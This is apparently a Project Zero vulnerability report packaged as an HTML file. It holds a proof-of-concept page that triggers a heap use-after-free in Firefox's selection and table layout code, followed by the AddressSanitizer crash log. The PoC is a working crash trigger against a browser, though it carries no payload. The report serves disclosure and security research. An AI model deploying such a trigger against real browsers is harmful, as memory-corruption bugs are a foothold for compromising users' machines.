@@ -1,0 +1,243 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1130
+
+Mozilla bug tracker link: https://bugzilla.mozilla.org/show_bug.cgi?id=1340138
+
+There is a use-after-free security vulnerability in Firefox. The vulnerability was confirmed on the nightly ASan build. 
+
+PoC and ASan log can be found below.
+Notes for reproducing:
+ - PoC uses domFuzzLite3 extension (https://www.squarefree.com/extensions/domFuzzLite3.xpi) in order to trigger the garbage collecor
+ - After the PoC is opened, it takes about 10 seconds for the crash to occur
+
+PoC:
+
+=================================================================
+-->
+
+<style>
+body { display: table }
+</style>
+<script>
+function freememory() {
+  try { fuzzPriv.forceGC(); } catch(err) { alert('Please install domFuzzLite3'); }
+}
+function go() {
+  var s = document.getSelection();
+  window.find("1",true,false,true,false);
+  s.modify("extend","forward","line");
+  document.body.append(document.createElement("table"));
+  freememory()
+}
+</script>
+<body onload=go()>
+<table>
+<th>u~Z1Cqn`aA}SOkre=]{</th>
+</table>
+<progress></progress>
+
+<!--
+=================================================================
+
+ASan log:
+
+=================================================================
+==119582==ERROR: AddressSanitizer: heap-use-after-free on address 0x60b000214ce8 at pc 0x7f46d6781c12 bp 0x7ffdc29fc1f0 sp 0x7ffdc29fc1e8
+READ of size 8 at 0x60b000214ce8 thread T0
+    #0 0x7f46d6781c11 in operator! /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:308:36
+    #1 0x7f46d6781c11 in IsInSelection /home/worker/workspace/build/src/dom/base/nsRange.h:120
+    #2 0x7f46d6781c11 in nsRange::IsNodeSelected(nsINode*, unsigned int, unsigned int) /home/worker/workspace/build/src/dom/base/nsRange.cpp:202
+    #3 0x7f46da800fd3 in nsIFrame::IsSelected() const /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:10107:5
+    #4 0x7f46daaa29f6 in nsTableCellFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableCellFrame.cpp:539:11
+    #5 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #6 0x7f46daab9bce in nsTableFrame::GenericTraversal(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1212:5
+    #7 0x7f46daaba703 in nsTableFrame::DisplayGenericTablePart(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&, nsDisplayTableItem*, void (*)(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&)) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1267:3
+    #8 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #9 0x7f46dab10731 in DisplayRows(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableRowGroupFrame.cpp:231:5
+    #10 0x7f46daaba703 in nsTableFrame::DisplayGenericTablePart(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&, nsDisplayTableItem*, void (*)(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&)) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1267:3
+    #11 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #12 0x7f46daab9bce in nsTableFrame::GenericTraversal(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1212:5
+    #13 0x7f46daaba703 in nsTableFrame::DisplayGenericTablePart(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&, nsDisplayTableItem*, void (*)(nsDisplayListBuilder*, nsFrame*, nsRect const&, nsDisplayListSet const&)) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1267:3
+    #14 0x7f46daabb382 in nsTableFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableFrame.cpp:1373:3
+    #15 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #16 0x7f46dab24b16 in BuildDisplayListForInnerTable /home/worker/workspace/build/src/layout/tables/nsTableWrapperFrame.cpp:207:5
+    #17 0x7f46dab24b16 in nsTableWrapperFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/tables/nsTableWrapperFrame.cpp:180
+    #18 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #19 0x7f46da7912d2 in DisplayLine(nsDisplayListBuilder*, nsRect const&, nsRect const&, nsLineList_iterator&, int, int&, nsDisplayListSet const&, nsBlockFrame*, mozilla::css::TextOverflow*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:6585:5
+    #20 0x7f46da7890ce in nsBlockFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:6677:7
+    #21 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #22 0x7f46da7b22f2 in nsCanvasFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:558:5
+    #23 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #24 0x7f46da87ebf2 in mozilla::ScrollFrameHelper::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:3497:7
+    #25 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #26 0x7f46da735b0a in mozilla::ViewportFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:63:5
+    #27 0x7f46da80417b in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsRect const&, nsDisplayList*) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2381:5
+    #28 0x7f46da990123 in nsSubDocumentFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:471:7
+    #29 0x7f46da80417b in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsRect const&, nsDisplayList*) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2381:5
+    #30 0x7f46da78d228 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2910:5
+    #31 0x7f46dac92672 in nsStackFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsStackFrame.cpp:59:5
+    #32 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #33 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #34 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #35 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #36 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #37 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #38 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #39 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #40 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #41 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #42 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #43 0x7f46dac0f946 in nsDeckFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsDeckFrame.cpp:199:3
+    #44 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #45 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #46 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #47 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #48 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #49 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #50 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #51 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #52 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #53 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #54 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #55 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #56 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #57 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #58 0x7f46dac0f946 in nsDeckFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsDeckFrame.cpp:199:3
+    #59 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #60 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #61 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #62 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #63 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #64 0x7f46dac0f946 in nsDeckFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsDeckFrame.cpp:199:3
+    #65 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #66 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #67 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #68 0x7f46dac08048 in nsBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1352:3
+    #69 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #70 0x7f46dac0918f in nsBoxFrame::BuildDisplayListForChildren(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsBoxFrame.cpp:1392:5
+    #71 0x7f46dac64b7e in nsRootBoxFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/xul/nsRootBoxFrame.cpp:195:3
+    #72 0x7f46da78d923 in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsRect const&, nsDisplayListSet const&, unsigned int) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2954:7
+    #73 0x7f46da735b0a in mozilla::ViewportFrame::BuildDisplayList(nsDisplayListBuilder*, nsRect const&, nsDisplayListSet const&) /home/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:63:5
+    #74 0x7f46da80417b in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsRect const&, nsDisplayList*) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2381:5
+    #75 0x7f46da6623a6 in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, nsDisplayListBuilderMode, nsLayoutUtils::PaintFrameFlags) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3565:5
+    #76 0x7f46da565487 in mozilla::PresShell::Paint(nsView*, nsRegion const&, unsigned int) /home/worker/workspace/build/src/layout/base/PresShell.cpp:6481:5
+    #77 0x7f46d9d6c897 in nsViewManager::ProcessPendingUpdatesPaint(nsIWidget*) /home/worker/workspace/build/src/view/nsViewManager.cpp:484:7
+    #78 0x7f46d9d6be97 in nsViewManager::ProcessPendingUpdatesForView(nsView*, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:416:9
+    #79 0x7f46d9d6f40d in nsViewManager::ProcessPendingUpdates() /home/worker/workspace/build/src/view/nsViewManager.cpp:1105:5
+    #80 0x7f46da4bfc8a in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2037:7
+    #81 0x7f46da4cbd25 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:305:7
+    #82 0x7f46da4cb9f4 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:327:5
+    #83 0x7f46da4ce063 in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:722:5
+    #84 0x7f46da4ce063 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:631
+    #85 0x7f46da4c9157 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::ParentProcessVsyncNotifier::Run() /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:508:9
+    #86 0x7f46d3c2db89 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7
+    #87 0x7f46d3c2a480 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10
+    #88 0x7f46d4a43eb4 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:124:5
+    #89 0x7f46d49b5028 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3
+    #90 0x7f46d49b5028 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231
+    #91 0x7f46d49b5028 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211
+    #92 0x7f46d9ded82f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3
+    #93 0x7f46dd430051 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19
+    #94 0x7f46dd5edc0c in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4470:10
+    #95 0x7f46dd5ef708 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4647:8
+    #96 0x7f46dd5f09cc in XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4738:16
+    #97 0x4dfebf in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:234:10
+    #98 0x4dfebf in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:305
+    #99 0x7f46eefdb82f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291
+    #100 0x41c2e8 in _start (/home/ifratric/p0/latest/firefox/firefox+0x41c2e8)
+
+0x60b000214ce8 is located 88 bytes inside of 112-byte region [0x60b000214c90,0x60b000214d00)
+freed by thread T0 here:
+    #0 0x4b2a3b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3
+    #1 0x7f46d3acb2c4 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2664:9
+    #2 0x7f46d3acaeb6 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2839:3
+    #3 0x7f46d53d990e in AsyncFreeSnowWhite::Run() /home/worker/workspace/build/src/js/xpconnect/src/XPCJSContext.cpp:145:34
+    #4 0x7f46d3c2db89 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7
+    #5 0x7f46d3c2a480 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10
+    #6 0x7f46d4a43ebf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21
+    #7 0x7f46d49b5028 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3
+    #8 0x7f46d49b5028 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231
+    #9 0x7f46d49b5028 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211
+    #10 0x7f46d9ded82f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3
+    #11 0x7f46dd430051 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19
+    #12 0x7f46dd5edc0c in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4470:10
+    #13 0x7f46dd5ef708 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4647:8
+    #14 0x7f46dd5f09cc in XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4738:16
+    #15 0x4dfebf in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:234:10
+    #16 0x4dfebf in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:305
+    #17 0x7f46eefdb82f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291
+
+previously allocated by thread T0 here:
+    #0 0x4b2d5b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3
+    #1 0x4e10cd in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17
+    #2 0x7f46d6796c00 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12
+    #3 0x7f46d6796c00 in nsRange::CloneRange() const /home/worker/workspace/build/src/dom/base/nsRange.cpp:2495
+    #4 0x7f46d67970ba in nsRange::CloneRange(nsIDOMRange**) /home/worker/workspace/build/src/dom/base/nsRange.cpp:2507:14
+    #5 0x7f46d66801d4 in nsHTMLCopyEncoder::SetSelection(nsISelection*) /home/worker/workspace/build/src/dom/base/nsDocumentEncoder.cpp:1426:5
+    #6 0x7f46d6596c5e in SelectionCopyHelper(nsISelection*, nsIDocument*, bool, short, unsigned int, nsITransferable**) /home/worker/workspace/build/src/dom/base/nsCopySupport.cpp:199:10
+    #7 0x7f46da97e9ee in nsAutoCopyListener::NotifySelectionChanged(nsIDOMDocument*, nsISelection*, short) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6667:10
+    #8 0x7f46da95f019 in mozilla::dom::Selection::NotifySelectionListeners() /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6254:5
+    #9 0x7f46da97806c in NotifySelectionListeners /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:2429:12
+    #10 0x7f46da97806c in mozilla::dom::Selection::Extend(nsINode&, unsigned int, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:5762
+    #11 0x7f46da9533e7 in Extend /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:5474:3
+    #12 0x7f46da9533e7 in nsFrameSelection::TakeFocus(nsIContent*, unsigned int, unsigned int, mozilla::CaretAssociationHint, bool, bool) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:1873
+    #13 0x7f46da94ebaf in nsFrameSelection::MoveCaret(nsDirection, bool, nsSelectionAmount, nsFrameSelection::CaretMovementStyle) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:1160:14
+    #14 0x7f46da97c97d in mozilla::dom::Selection::Modify(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6426:8
+    #15 0x7f46d730a949 in mozilla::dom::SelectionBinding::modify(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Selection*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/SelectionBinding.cpp:778:3
+    #16 0x7f46d7fdbf77 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2951:13
+    #17 0x7f46dda78c24 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:281:15
+    #18 0x7f46dda78c24 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:463
+    #19 0x7f46dda5ef88 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:514:12
+    #20 0x7f46dda5ef88 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2960
+    #21 0x7f46dda4411a in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:409:12
+    #22 0x7f46dda78eb7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:481:15
+    #23 0x7f46dda79552 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:527:10
+    #24 0x7f46de426f3c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2865:12
+    #25 0x7f46d7b59632 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37
+    #26 0x7f46d845fbbd in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12
+    #27 0x7f46d845fbbd in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214
+    #28 0x7f46d842a6f9 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1123:16
+    #29 0x7f46d842c5b4 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20
